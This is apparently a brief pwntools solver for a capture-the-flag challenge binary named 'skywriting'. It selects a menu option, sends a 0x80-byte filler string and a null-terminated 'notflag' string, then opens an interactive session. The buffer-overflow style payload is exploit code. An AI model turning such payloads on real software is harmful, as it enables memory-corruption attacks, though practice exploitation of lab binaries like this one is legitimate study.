from pwn import *
context.update(log_level='debug')

p = process('bin/skywriting')

p.recvrepeat(1)

p.sendline('1')

p.sendlineafter(':', 'a'*0x80)

p.sendlineafter(':', 'notflag{a_cloud_is_just_someone_elses_computer}\n'+'\x00')

p.interactive()
